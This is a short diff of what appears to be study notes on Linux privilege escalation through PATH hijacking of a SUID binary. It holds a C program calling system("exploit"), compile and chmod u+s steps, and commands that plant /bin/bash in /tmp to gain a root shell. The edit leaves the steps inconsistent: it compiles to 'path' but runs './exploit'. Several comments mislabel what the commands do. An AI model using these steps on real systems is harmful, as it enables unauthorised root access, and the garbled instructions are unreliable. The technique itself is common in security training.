@@ -58,7 +58,7 @@ Use **echo $PATH**
 
 **find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u** to hide running related proccesses. 
 
-**path.c**
+**exploit.c**
 ```
 #include<unistd.h>
 void main()
@@ -67,12 +67,12 @@ void main()
   system("exploit");
 }
 ```
-* gcc path.c -o path -w *Complies code*
+* gcc exploit.c -o path -w *Complies code*
 * chmod u+s path *Changes file permissions*
 * export PATH=/tmp:$PATH *Creates a file in $PATH*
 * echo "/bin/bash" > /tmp/exploit
 * chmod 777 /tmp/exploit
-* ./path
+* ./exploit
  
 
 
